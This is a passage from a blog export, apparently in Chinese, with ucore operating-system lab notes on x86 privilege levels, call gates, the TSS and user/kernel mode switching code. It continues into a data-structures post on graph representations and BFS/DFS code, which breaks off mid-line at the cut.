<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">switch_to_user</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">asm</span> <span class="title">volatile</span> <span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">	    <span class="string">&quot;sub $0x8, %%esp \n&quot;</span></span></span></span><br><span class="line"><span class="function"><span class="params">	    <span class="string">&quot;int %0 \n&quot;</span></span></span></span><br><span class="line"><span class="function"><span class="params">	    <span class="string">&quot;movl %%ebp, %%esp&quot;</span></span></span></span><br><span class="line"><span class="function"><span class="params">	    : </span></span></span><br><span class="line"><span class="function"><span class="params">	    : <span class="string">&quot;i&quot;</span>(T_SWITCH_TOU)</span></span></span><br><span class="line"><span class="function"><span class="params">	)</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">switch_to_kernel</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">asm</span> <span class="title">volatile</span> <span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">	    <span class="string">&quot;int %0 \n&quot;</span></span></span></span><br><span class="line"><span class="function"><span class="params">	    <span class="string">&quot;movl %%ebp, %%esp \n&quot;</span></span></span></span><br><span class="line"><span class="function"><span class="params">	    : </span></span></span><br><span class="line"><span class="function"><span class="params">	    : <span class="string">&quot;i&quot;</span>(T_SWITCH_TOK)</span></span></span><br><span class="line"><span class="function"><span class="params">	)</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> IRQ_OFFSET + IRQ_KBD:</span><br><span class="line">        c = cons_getc();</span><br><span class="line">		<span class="keyword">if</span>(c==<span class="string">&#x27;3&#x27;</span>)&#123;</span><br><span class="line">			switch_to_user();</span><br><span class="line">			print_trapframe(tf);</span><br><span class="line">		&#125;<span class="keyword">else</span> <span class="keyword">if</span>(c==<span class="string">&#x27;0&#x27;</span>)&#123;</span><br><span class="line">			switch_to_kern();</span><br><span class="line">			print_trapframe(tf);</span><br><span class="line">		&#125;</span><br><span class="line">        cprintf(<span class="string">&quot;kbd [%03d] %c\n&quot;</span>, c, c);</span><br><span class="line">        <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>描述符特权级DPL、当前特权级CPL和请求特权级RPL的含义是什么？在哪些寄存器中存在这些字段？对应的访问条件是什么？</p>
</blockquote>
<p><strong>Requested privilege level (RPL)</strong>   RPL保存在选择子的最低两位。RPL说明的是进程对段访问的请求权限，也就是当前进程想要的请求权限。</p>
<p><strong>Current privilege level (CPL)</strong>   当前执行程序或任务的特权级。存储在CS和SS的bits 0和1上。通常情况下，CPL代表当前取出指令所在的代码段的特权级。当程序转移到不同特权级的代码段时，处理器将改变CPL。在ucore中只有0和3两个值，分别表示用户态和内核态。</p>
<p><strong>Descriptor privilege level (DPL)</strong>   表示段或门的特权级,存储在段描述符或者门描述符的DPL字段，每个段的CPL值固定。若当前代码段试图访问一个段或者门，DPL将根据段或者门类型的不同采取不同的处理。</p>
<p>访问门时要求CPL &lt;= DPL(门)&amp; CPL&gt;= DPL(段)；访问段时要求max(CPL,DPL)&lt;=DPL[段]。</p>
<blockquote>
<p>课件上写到访问门时要求CPL &lt;= DPL(门)&amp; CPL&gt;= DPL(段),但陈老师上课的时候提到门的作用是让低特权级的有可能访问到高特权级，而段的作用是高特权级进行检查和保护。<br>这样理解的话访问门时应是CPL &gt;= DPL(门）&amp; CPL &lt;= DPL(段），即访问门时特权较低，然后段检查时要求特权较高，与课件中所示矛盾？</p>
</blockquote>
<p>这里是不矛盾的，这两个条件不会同时检查。通过门访问时，会先有一个栈切换。栈切换时，特权级已经变了。</p>
<p>以上即为“Example of Accessing Call Gates At Various Privilege Levels”，对应于课件中“x86访问门时的特权级：CPL &lt;= DPL[门] &amp; CPL &gt;= DPL[段]”。</p>
<p>首先手册中Table 5-1给出了访问门时的特权级检查规则（此处仅考虑使用call而非jmp）：</p>
<p><img src="https://d1b10bmlvqabco.cloudfront.net/attach/i5j09fnsl7k5x0/isy2wn7zj0u2ne/jez1858vk8bt/chart.PNG" alt="访问门时的特权级检查规则"></p>
<p> 可以看到，对于DPL有两个概念需要区分：其一是门本身的gate DPL，其二是门对应的目标代码段的code segment DPL. 此外，这里还有两个名词需要解释：</p>
<ul>
<li>conforming code segment：一致代码段，可以被低特权级的用户直接调用访问的代码，但是特权级不会改变，用户态还是用户态</li>
<li>nonconforming code segment：非一致代码段，只允许同级间访问，绝对禁止不同级访问</li>
</ul>
<p>这样就可以理解课件中提到的“CPL &lt;= DPL[门] &amp; CPL &gt;= DPL[段]”的含义如下：</p>
<ul>
<li>对于第一条“CPL &lt;= DPL[门]”，对应的是Table 5-1中第一条条件，即门本身是可以在当前特权级下被访问到的</li>
<li>对于第二条“CPL &gt;= DPL[段]”，对应的是Table 5-1中第二条条件，即门对应的目标代码段（可以理解为门指向的中断服务例程代码）所满足的条件，也就是要求目标代码的DPL不大于当前特权级；这一点很好理解，因为目标代码段一般为核心代码，其本身的DPL为核心等级，但存在处于用户态的进程需要执行这些代码的需求（如系统调用），因此允许目标代码DPL小于CPL的情况出现。但针对代码段是conforming还是nonconforming，会涉及到是否要变更CPL</li>
</ul>
<p>下面举出手册中的例子。作为例子的Figure 5-12如下：</p>
<p><img src="https://d1b10bmlvqabco.cloudfront.net/attach/i5j09fnsl7k5x0/isy2wn7zj0u2ne/jez1hfzyi9sr/fig.PNG" alt="不同特权级访问门的例子"></p>
<p> 仅以在ring 3访问Gate A为例：</p>
<ul>
<li>当前处于用户态的代码段A，CPL=3</li>
<li>通过Gate Selector A以RPL=3访问门A，门A的DPL=3，这满足Table 5-1的第一条检查条件，即“CPL &lt;= call gate DPL, RPL &lt;= call gate DPL”</li>
<li>在满足上面的条件后，则可以跳转并执行门A对应的核心态代码段E（可以理解为门A对应的中断服务例程），代码段E的DPL=0，小于CPL，对于call gate而言这是允许的，满足Table 5-1的第二条检查条件</li>
<li>由于代码段E是nonconforming code segment，所以会要求CPL的特权级变更（需要变为代码段E的同级即ring 0），因而会导致stack switch（作为对比，访问代码段D时不需要stack switch）</li>
</ul>
<blockquote>
<p>CPL、DPL和RPL在中断响应、函数调用和指令执行时的作用</p>
</blockquote>
<p>访问段时：从高优先级代码访问低优先级数据</p>
<p>访问门时：从低优先级代码访问高优先级服务</p>
<blockquote>
<p>一条指令在执行时会有哪些可能的特权级判断？</p>
</blockquote>
<p>当代码访问数据时，需要check 当前特权级是否等于或高于要访问的数据段的DPL。<br>如果是通过段寄存器SS访问数据段，则要求CPL、RPL均等于 DPL。<br>如果代码涉及到控制转移，则一般只允许低特权级调用高特权级代码。<br>发生中断或异常时，需要判断当前的门描述符的特权级和目标代码的特权级，CPL&lt;=DPL[门]&amp;&amp;CPL&gt;=DPL[段]。</p>
<blockquote>
<p>在什么情况下会出现特权级切换？</p>
</blockquote>
<p>当低特权级代码调用高特权级代码(不一致代码段)时，或者中断等发生时。</p>
<blockquote>
<p>TSS和Task Register的作用是什么？</p>
</blockquote>
<p>TSS是X86上维护执行任务有关信息的描述符表，由操作系统内核用于任务管理。</p>
<p>TR为特殊的16位段寄存器，用于保存TSS的段选择子。</p>
<p>TSS中字段有：</p>
<ul>
<li><a href="https://en.wikipedia.org/wiki/Processor_register">处理器寄存器</a>状态</li>
<li>I / O端口权限</li>
<li>内层堆栈指针</li>
<li>之前的TSS链接</li>
</ul>
<p>处理器寄存器状态涉及内容比较多，有：</p>
<ul>
<li><p>读/写字段  在硬件任务切换期间读取和写入</p>
<ul>
<li>所有通用寄存器（<code>EAX</code>，<code>EBX</code>，<code>ECX</code>，<code>EDX</code>，<code>ESI</code>，<code>EDI</code>，<code>EBP</code>，<code>ESP</code>）;</li>
</ul>
</li>
<li><p>所有段寄存器（<code>CS</code>，<code>DS</code>，<code>ES</code>，<code>FS</code>，<code>GS</code>，<code>SS</code>）;</p>
<ul>
<li>当前执行状态（<code>EIP</code>，<code>EFlags</code>）;</li>
<li>新TSS中的link字段(call或int而不是jmp的任务切换)</li>
</ul>
</li>
<li><p>只读字段 只在需要时读取</p>
<ul>
<li>Control Register 3 (<code>CR3</code>)，也称为页目录基址寄存器，在硬件任务切换期间读取。</li>
<li>The Local Descriptor Table register (<code>LDTR</code>)，在硬件任务切换期间读取。</li>
<li>3个堆栈切换对(<code>SS0:ESP0</code>, <code>SS1:ESP1</code>, <code>SS2:ESP2</code>)，在调用<code>CALL</code>或<code>INT</code>后建立新堆栈。</li>
<li>I/O端口位图指针和位图本身</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>Systems</category>
      </categories>
      <tags>
        <tag>ucore</tag>
      </tags>
  </entry>
  <entry>
    <title>图</title>
    <url>/algorithm/graph/</url>
    <content><![CDATA[<p>在城市交通图中联接于各公交站之间的街道，或者在互联网中联接于IP之间的二元关系，这类信息往往可表述为定义于一组对象之间的二元关系。相互之间均可能存在二元关系的一组对象，属于非线性结构。图结构是描述这类信息的典型结构，通过遍历将其转化为半线性结构，进而借助树的相关算法解决问题。</p>
<a id="more"></a>

<p>所谓的图，可定义为$G=(V;E)$,其中，集合V中的元素称作顶点，集合E中的元素分别对应于$V$中的某一对顶点，表示它们之间存在某种关系，故亦称作边。同一条边的两个顶点彼此邻接，同一顶点自我邻接，构成自环，不含自环即为简单图。</p>
<p>若邻接顶点$u$和$v$的次序无所谓，则$(u,v)$为无向边。所有边均无方向的图称为无向图。</p>
<p>有向边$(u,v)$从$u$指向$v$，其中$u$称作该边的起点，而v称作该边的终点。</p>
<p>图$G(V;E)$的子图$T=(V;F)$若是树，则为其支撑树。同一图的支撑树通常并不唯一。同一网络的支撑树中，总权重最小者为最小支撑树MST。</p>
<h1 id="邻接矩阵"><a href="#邻接矩阵" class="headerlink" title="邻接矩阵"></a>邻接矩阵</h1><p>用二维矩阵记录顶点之间的联接关系，一一对应：矩阵元素对应图中可能存在的边。<br>$$<br>A[i,j]=\left{<br>\begin{aligned}<br>1 ,&amp; 若顶点i与j之间存在联边 \<br>0 ,&amp;  若顶点i与j之间不存在联边\<br>\end{aligned}<br>\right.<br>$$<br>由于为简单图，所以对角线统一设置为0。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> Tv&gt; <span class="class"><span class="keyword">struct</span> <span class="title">Vertex</span> &#123;</span> <span class="comment">//顶点对象（为简化起见，并未严格封装）</span></span><br><span class="line">   Tv data; <span class="keyword">int</span> inDegree, outDegree; VStatus status; <span class="comment">//数据、出入度数、状态</span></span><br><span class="line">   <span class="keyword">int</span> dTime, fTime; <span class="comment">//时间标签</span></span><br><span class="line">   <span class="keyword">int</span> parent; <span class="keyword">int</span> priority; <span class="comment">//在遍历树中的父节点、优先级数</span></span><br><span class="line">   Vertex ( Tv <span class="keyword">const</span>&amp; d = ( Tv ) <span class="number">0</span> ) : <span class="comment">//构造新顶点</span></span><br><span class="line">      data ( d ), inDegree ( <span class="number">0</span> ), outDegree ( <span class="number">0</span> ), status ( UNDISCOVERED ),</span><br><span class="line">      dTime ( <span class="number">-1</span> ), fTime ( <span class="number">-1</span> ), parent ( <span class="number">-1</span> ), priority ( INT_MAX ) &#123;&#125; <span class="comment">//暂不考虑权重溢出</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> &#123;</span> UNDISCOVERED, DISCOVERED, VISITED &#125; VStatus; <span class="comment">//顶点状态</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> &#123;</span> UNDETERMINED, TREE, CROSS, FORWARD, BACKWARD &#125; EType; <span class="comment">//边在遍历树中所属的类型</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> Te&gt; <span class="class"><span class="keyword">struct</span> <span class="title">Edge</span> &#123;</span> <span class="comment">//边对象（为简化起见，并未严格封装）</span></span><br><span class="line">   Te data; <span class="keyword">int</span> weight; EType type; <span class="comment">//数据、权重、类型</span></span><br><span class="line">   Edge ( Te <span class="keyword">const</span>&amp; d, <span class="keyword">int</span> w ) : data ( d ), weight ( w ), type ( UNDETERMINED ) &#123;&#125; <span class="comment">//构造</span></span><br><span class="line">&#125;;<span class="keyword">template</span> &lt;<span class="keyword">typename</span> Tv, <span class="keyword">typename</span> Te&gt; <span class="comment">//顶点类型、边类型</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GraphMatrix</span> :</span> <span class="keyword">public</span> Graph&lt;Tv, Te&gt; &#123; <span class="comment">//基于向量，以邻接矩阵形式实现的图</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">   Vector&lt; Vertex&lt; Tv &gt; &gt; V; <span class="comment">//顶点集（向量）</span></span><br><span class="line">   Vector&lt; Vector&lt; Edge&lt; Te &gt; * &gt; &gt; E; <span class="comment">//边集（邻接矩阵）</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">   GraphMatrix() &#123; n = e = <span class="number">0</span>; &#125; <span class="comment">//构造</span></span><br><span class="line">   ~GraphMatrix() &#123; <span class="comment">//析构</span></span><br><span class="line">      <span class="keyword">for</span> ( <span class="keyword">int</span> j = <span class="number">0</span>; j &lt; n; j++ ) <span class="comment">//所有动态创建的</span></span><br><span class="line">         <span class="keyword">for</span> ( <span class="keyword">int</span> k = <span class="number">0</span>; k &lt; n; k++ ) <span class="comment">//边记录</span></span><br><span class="line">            <span class="keyword">delete</span> E[j][k]; <span class="comment">//逐条清除</span></span><br><span class="line">   &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>适用范围广泛，尤其适用于稠密图，可处理隐式图。</p>
<h2 id="时间复杂度"><a href="#时间复杂度" class="headerlink" title="时间复杂度"></a>时间复杂度</h2><table>
<thead>
<tr>
<th>判断两点之间是否存在联边</th>
<th>$O(1)$</th>
</tr>
</thead>
<tbody><tr>
<td>获取顶点的出/入度数</td>
<td>$O(1)$</td>
</tr>
<tr>
<td>添加、删除边后更新度数</td>
<td>$O(1)$</td>
</tr>
</tbody></table>
<p>由于向量循秩访问的特点，所有静态操作接口，均只需常数时间。边的静态操作和动态操作也只需常数时间，代价是邻接矩阵的空间冗余。但是顶点的动态操作非常耗时，为了插入新的顶点，顶点集向量需添加一个元素，边集向量也需要添加一行，且每行都需要添加一个元素。</p>
<blockquote>
<p>计入向量扩容所需的时间，分摊而言，插入顶点的复杂度不超过$O(n)$</p>
</blockquote>
<p>每一向量扩容的单次插入操作，在分摊意义上来说为常数时间，在每一顶点插入过程中，n个向量的操作(包括扩容操作)完全同步，故总体的分摊时间不超过分摊的$O(n)$</p>
<p>当然，为了插入一个顶点，在最坏情况下需要访问和修改整个邻接矩阵，共需$O(n^2)$时间。</p>
<h2 id="空间复杂度"><a href="#空间复杂度" class="headerlink" title="空间复杂度"></a>空间复杂度</h2><p>空间复杂度为$O(n^2)$,与实际边数无关。</p>
<p>对于无向图，可将二维邻接矩阵映射为一维向量，空间复杂度为之前的一半，渐进意义而言，空间复杂度仍然为$O(n^2)$。</p>
<p><strong>关联矩阵</strong></p>
<p>用二维矩阵记录顶点与边之间的联接关系，空间复杂度为$O(ne)=O(n^3)$<br>$$<br>I[i,j]=\left{<br>\begin{aligned}<br>1 ,&amp; 第j条边从第i个节点出发 \<br>-1,&amp; 第j条边进入第i个节点 \<br>0 , &amp; 否则<br>\end{aligned}<br>\right.<br>$$<br>基于关联矩阵，可以将差分约束系统转换为有向带权图，将差分约束变量视作顶点，将差分约束矩阵视为关联矩阵，如此一来，原问题转换为了有向带权图的最短路径问题。</p>
<h1 id="邻接表"><a href="#邻接表" class="headerlink" title="邻接表"></a>邻接表</h1><p>类似于关联矩阵的思路，将关联矩阵组织的各行组织为列表，只记录存在的边</p>
<h2 id="空间复杂度-1"><a href="#空间复杂度-1" class="headerlink" title="空间复杂度"></a>空间复杂度</h2><p>有向图=$O(n+e)$</p>
<p>无向图=$O(n+2e)=O(n+e)$</p>
<p>无向弧被重复存储，可通过双向链表的方式解决。</p>
<p>适用于稀疏图</p>
<h2 id="时间复杂度-1"><a href="#时间复杂度-1" class="headerlink" title="时间复杂度"></a>时间复杂度</h2><table>
<thead>
<tr>
<th>建立邻接表</th>
<th>$O(n+ e)$</th>
</tr>
</thead>
<tbody><tr>
<td>枚举从$v$出发的边</td>
<td>$O(1+deg(v))$</td>
</tr>
<tr>
<td>枚举顶点$v$的邻居(无向图)</td>
<td>$O(1 + deg(v))$</td>
</tr>
<tr>
<td>枚举到$v$的边</td>
<td>$O( n+ e)$</td>
</tr>
</tbody></table>
<blockquote>
<p>计算顶点v的出度/入度</p>
</blockquote>
<p>增加度数记录域：$O(n)$记录空间</p>
<p>增加/删除边时更新度数:$O(1)$时间</p>
<p>每次查询$O(1)$时间</p>
<p>建立逆邻接表可将枚举到$v$的边时间复杂度降低至$O(1+deg(v))$,但是空间复杂度有所上升。</p>
<blockquote>
<p>给定$u$,$v$，判断$u$,$v$之间是否存在与$u$,$v$相关的边</p>
</blockquote>
<p>遍历顶点$i$对应的边表，方可判定是否存在与顶点$j$相关联者，所以所需时间也由$O(1)$增加至$O(deg(i))$</p>
<p>有向图：搜索$u$的邻接表，$O(deg(u))=O(e)$</p>
<p>无向图：搜索$u$或$v$的邻接表，$O(max(deg(u),deg(v)))=O(e)$</p>
<p>并行搜索：$O(2min(deg(u),deg(v)))=O(e)$</p>
<p>借助散列，边的判定可降低至$O(1)$，空间与邻接表相同。</p>
<blockquote>
<p>为什么有时仍用邻接矩阵，仅仅是处理简单？</p>
</blockquote>
<p>可处理欧拉路之类的隐式图</p>
<h1 id="取舍原则"><a href="#取舍原则" class="headerlink" title="取舍原则"></a>取舍原则</h1><p>用邻接矩阵还是邻接表来表示图，取决于以下原则：</p>
<ul>
<li>空间/速度</li>
<li>顶点类型</li>
<li>弧类型(方向/权值)</li>
<li>图类型(稠密图)</li>
</ul>
<h2 id="适用场合"><a href="#适用场合" class="headerlink" title="适用场合"></a>适用场合</h2><table>
<thead>
<tr>
<th>邻接矩阵</th>
<th>邻接表</th>
</tr>
</thead>
<tbody><tr>
<td>经常检测边的存在</td>
<td>经常计算顶点的度数</td>
</tr>
<tr>
<td>经常做边的插入/删除</td>
<td>顶点数目不确定</td>
</tr>
<tr>
<td>图的规模固定</td>
<td>经常做遍历</td>
</tr>
<tr>
<td>稠密图</td>
<td>稀疏图</td>
</tr>
</tbody></table>
<p>图的遍历可理解为将非线性结构转化为半线性结构的过程。经遍历确定的边类型中，最重要的一类边为树边，他们与所有顶点共同构成了图的一棵支撑树，称作遍历树。</p>
<h1 id="广度优先搜索"><a href="#广度优先搜索" class="headerlink" title="广度优先搜索"></a>广度优先搜索</h1><p>在广度优先算法中，越早被访问到的顶点，其邻居越优先被选用，而同一顶点所有邻居之间的优先级反而并不重要。例如，起始于顶点$s$的BFS搜索，首先访问顶点$s$​，再访问$s$所有未访问的邻居，再按后者的次序逐个访问它们的邻居。在所有已访问到的顶点中，仍有邻居尚未访问者，构成所谓的波峰集，于是BFS搜索过程也可等效理解为</p>
<p><strong>反复从波峰集找到最早被访问的顶点$v$，若其邻居均已访问到，则将其逐出波峰集，否则，随意选出一个尚未访问到的邻居，并将其加入到波峰集中。</strong></p>
<p>将图的BFS搜索应用于树结构，则其效果等效于树的层次遍历。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> Tv, <span class="keyword">typename</span> Te&gt; <span class="comment">//广度优先搜索BFS算法（全图）</span></span><br><span class="line"><span class="keyword">void</span> Graph&lt;Tv, Te&gt;::bfs ( <span class="keyword">int</span> s ) &#123; <span class="comment">//assert: 0 &lt;= s &lt; n</span></span><br><span class="line">   reset(); <span class="keyword">int</span> clock = <span class="number">0</span>; <span class="keyword">int</span> v = s; <span class="comment">//初始化</span></span><br><span class="line">   <span class="keyword">do</span> <span class="comment">//逐一检查所有顶点</span></span><br><span class="line">      <span class="keyword">if</span> ( UNDISCOVERED == status ( v ) ) <span class="comment">//一旦遇到尚未发现的顶点</span></span><br><span class="line">         BFS ( v, clock ); <span class="comment">//即从该顶点出发启动一次BFS</span></span><br><span class="line">   <span class="keyword">while</span> ( s != ( v = ( ++v % n ) ) ); <span class="comment">//按序号检查，故不漏不重</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> Tv, <span class="keyword">typename</span> Te&gt; <span class="comment">//广度优先搜索BFS算法（单个连通域）</span></span><br><span class="line"><span class="keyword">void</span> Graph&lt;Tv, Te&gt;::BFS ( <span class="keyword">int</span> v, <span class="keyword">int</span>&amp; clock ) &#123; <span class="comment">//assert: 0 &lt;= v &lt; n</span></span><br><span class="line">   Queue&lt;<span class="keyword">int</span>&gt; Q; <span class="comment">//引入辅助队列</span></span><br><span class="line">   status ( v ) = DISCOVERED; Q.enqueue ( v ); <span class="comment">//初始化起点</span></span><br><span class="line">   <span class="keyword">while</span> ( !Q.empty() ) &#123; <span class="comment">//在Q变空之前，不断</span></span><br><span class="line">      <span class="keyword">int</span> v = Q.dequeue(); dTime ( v ) = ++clock; <span class="comment">//取出队首顶点v</span></span><br><span class="line">      <span class="keyword">for</span> ( <span class="keyword">int</span> u = firstNbr ( v ); <span class="number">-1</span> &lt; u; u = nextNbr ( v, u ) ) <span class="comment">//枚举v的所有邻居u</span></span><br><span class="line">         <span class="keyword">if</span> ( UNDISCOVERED == status ( u ) ) &#123; <span class="comment">//若u尚未被发现，则</span></span><br><span class="line">            status ( u ) = DISCOVERED; Q.enqueue ( u ); <span class="comment">//发现该顶点</span></span><br><span class="line">            type ( v, u ) = TREE; parent ( u ) = v; <span class="comment">//引入树边拓展支撑树</span></span><br><span class="line">         &#125; <span class="keyword">else</span> &#123; <span class="comment">//若u已被发现，或者甚至已访问完毕，则</span></span><br><span class="line">            type ( v, u ) = CROSS; <span class="comment">//将(v, u)归类于跨边</span></span><br><span class="line">         &#125;</span><br><span class="line">      status ( v ) = VISITED; <span class="comment">//至此，当前顶点访问完毕</span></span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>波峰集中各顶点始终按其在BFS树中的深度在辅助队列中单调排列，且任何时刻同处于辅助队列中的顶点，深度彼此相差不超过一个单位</p>
</blockquote>
<p>利用数学归纳法，证明该不变性在每一顶点入队后成立。</p>
<p>一般地，考查下一入队节点$u$,在BFS树中的深度在入队的同时确定，而就在$u$入队的那一步迭代之前，必有某一顶点$v$刚刚出队，在BFS树中$u$是$v$的孩子，故有：</p>
<p>$depth(h)=depth(v)+1$</p>
<p>因此，该不变性在该步迭代之前成立，则在$v$出队、$u$入队后应该继续成立。</p>
<blockquote>
<p>所有顶点按照在BFS树中的深度以非降次序接受访问</p>
</blockquote>
<p>BFS树是广度优先搜索的过程中自下而上逐层形成的，各顶点也是以其在树中的深度为序逐个被发现的，反过来，对原图的广度优先搜索过程，完全等同于对BFS树的层次遍历过程。</p>
<p>由原图各边所联接的每一对顶点，在BFS树中的深度相差至多不超过一个单位，其中特别地，由树边联接的顶点，在BFS树中的深度之差恰好为1。</p>
<blockquote>
<p>所有顶点按其到$s$的距离，以非降次序接受访问</p>
</blockquote>
<p>每一顶点到$s$的距离均等于在BFS树中的深度，也可以理解为bfs从s到v的路径，即为二者在原图中的最短通路。</p>
<p>反证法，假设至少有一个顶点不满足这个性质，考查此类顶点中$\pi()$值最小者u</p>
<p>既然在BFS树(原图的子图)中，已有一条长度为depth(v)的通路联接于顶点s和u之间(树depth的定义)。</p>
<p>故必然有$\pi(u) \leq depth(u)$</p>
<p>因此，不妨假定$\pi(u)&lt;depth(u)$</p>
<p>在原图中，考查$s$到$u$任何一条最短路径，其长度为$\pi(u)$。显然u不等于s，故u在该通路上的直接前驱节点存在。将次前驱节点记作$v$，则$v$应满足：</p>
<p>$\pi(v)=\pi(u)-1&lt;\pi(u)$</p>
<p>否则，可选其余顶点作为前驱节点</p>
<p>之前假定$u$为其中$\pi()$值最小者，$v$的$\pi()$值比$u$小，故必然满足这一性质</p>
<p>即得$depth(v)+1&lt;depth(u)$</p>
<p>然而根据之前的结论，在顶点$v$出队时，作为$v$的邻接顶点之一，$u$必然会在同一步迭代中入队，并同时确定其在BFS树中的深度为：</p>
<p>$depth(u)=depth(v)+1$</p>
<p>以上分析对有向图同样使用。</p>
<p>定义$dist(v,u)$为无向图中，任意顶点之间的最近距离。</p>
<p>由树边联接的顶点，$dist(s)$恰好相差1；</p>
<p>由跨边联接的顶点，$dist(s)$至多相差1.</p>
<blockquote>
<p>针对有向图和无向图讨论跨边的可能情况</p>
</blockquote>
<p>无向图任意一对邻接顶点在BFS树中的深度之差最多为1，因此在经过广度优先搜索后，无向图的各边无非分为两类：</p>
<ul>
<li>树边，$u$为<code>discovered</code>,$v$为<code>undiscovered</code>,亦是被BFS树采用的边</li>
<li>跨边，$u$为<code>discovered</code>,$v$为<code>discovered</code>,($u$和$v$之间存在路径，故$u$必然没有访问结束)亦即联接于来自不同分支、深度相同或最多相差一层的两个顶点之间的边</li>
</ul>
<p>有向图中每一条边$(v,u)$均必然满足，</p>
<p>$depth(u)\leq depth(v)+1$</p>
<p>这一不等式取等号时，$(v,u)$即是由$v$指向$u$的一条树边。</p>
<p>若满足：</p>
<p>$depth(u)=depth(v)$,则$v$和$u$在BFS树中分别属于不同的分支，$(v,u)$跨越于二者之间。</p>
<p>若满足：</p>
<p>$depth(u)&lt;depth(v)$</p>
<p>则在BFS树中,$u$既可能和$v$属于不同的分支，也可能就是$v$的祖先。</p>
<p>在有向边中还可能$u$处于<code>visited</code>,$v$处于<code>discovered</code>。</p>
<h2 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h2><p>$BFS(v)$以$v$为根，生成一棵BFS树，$n$个节点,$c$棵树，则有$n-c$条树边，故生成BFS森林包括$c$棵树，$n-c$条树边，$e-n+c$条跨边。</p>
<p><strong>联通域分解</strong></p>
<p>广度优先搜索算法，其算法BFS(v)只有在访遍顶点v所属的极大联通域之后方可返回，此外，若还有其他尚未访问的联通域，则算法主入口bfs()中的循环必然会继续检查其余的所有顶点，而一旦发现尚处于<code>UNDISCOVERED</code>,会在下次调用子算法BFS()并遍历该顶点属于的极大联通域。</p>
<p>按照BFS()的各次调用顺序，分批次输出所访问的顶点以及边，可实现无向图的极大联通域分解。</p>
<p><strong>最短路径</strong></p>
<p>经过广度优先搜索后，各顶点在BFS树中的深度值即是在原图中从起始顶点到他们的最小距离，因此，只需要调用该算法，在每个顶点入队时随即输出其所确定的深度值，而在最终生成的BFS树中，从树根到各顶点的唯一通路，即是对应的最短通路。任意两个顶点之间的最短通路可能不止一条，但是长度必然相同。</p>
<h1 id="深度优先搜索"><a href="#深度优先搜索" class="headerlink" title="深度优先搜索"></a>深度优先搜索</h1><p>深度优先搜索选取下一顶点的策略可概括为：优先选取最后一个被访问到的顶点的邻居。</p>
<p>于是，从顶点$s$出发的DFS搜索，将首先访问顶点$s$，再从顶点$s$所有未访问到的邻居任取其一，并从$s$所有未访问的邻居中任取一个，并从该顶点递归地执行DFS搜索,故各顶点访问的次序类似于树的先序遍历，而各顶点被访问完的次序，则类似于树的后序遍历。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> Tv, <span class="keyword">typename</span> Te&gt; <span class="comment">//深度优先搜索DFS算法（全图）</span></span><br><span class="line"><span class="keyword">void</span> Graph&lt;Tv, Te&gt;::dfs ( <span class="keyword">int</span> s ) &#123; <span class="comment">//assert: 0 &lt;= s &lt; n</span></span><br><span class="line">   reset(); <span class="keyword">int</span> clock = <span class="number">0</span>; <span class="keyword">int</span> v = s; <span class="comment">//初始化</span></span><br><span class="line">   <span class="keyword">do</span> <span class="comment">//逐一检查所有顶点</span></span><br><span class="line">      <span class="keyword">if</span> ( UNDISCOVERED == status ( v ) ) <span class="comment">//一旦遇到尚未发现的顶点</span></span><br><span class="line">         DFS ( v, clock ); <span class="comment">//即从该顶点出发启动一次DFS</span></span><br><span class="line">   <span class="keyword">while</span> ( s != ( v = ( ++v % n ) ) ); <span class="comment">//按序号检查，故不漏不重</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> Tv, <span class="keyword">typename</span> Te&gt; <span class="comment">//深度优先搜索DFS算法（单个连通域）</span></span><br><span class="line"><span class="keyword">void</span> Graph&lt;Tv, Te&gt;::DFS ( <span class="keyword">int</span> v, <span class="keyword">int</span>&amp; clock ) &#123; <span class="comment">//assert: 0 &lt;= v &lt; n</span></span><br><span class="line">   dTime ( v ) = ++clock; status ( v ) = DISCOVERED; <span class="comment">//发现当前顶点v</span></span><br><span class="line">   <span class="keyword">for</span> ( <span class="keyword">int</span> u = firstNbr ( v ); <span class="number">-1</span> &lt; u; u = nextNbr ( v, u ) ) <span class="comment">//枚举v的所有邻居u</span></span><br><span class="line">      <span class="keyword">switch</span> ( status ( u ) ) &#123; <span class="comment">//并视其状态分别处理</span></span><br><span class="line">         <span class="keyword">case</span> UNDISCOVERED: <span class="comment">//u尚未发现，意味着支撑树可在此拓展</span></span><br><span class="line">            type ( v, u ) = TREE; parent ( u ) = v; DFS ( u, clock ); <span class="keyword">break</span>;</span><br><span class="line">         <span class="keyword">case</span> DISCOVERED: <span class="comment">//u已被发现但尚未访问完毕，应属被后代指向的祖先</span></span><br><span class="line">            type ( v, u ) = BACKWARD; <span 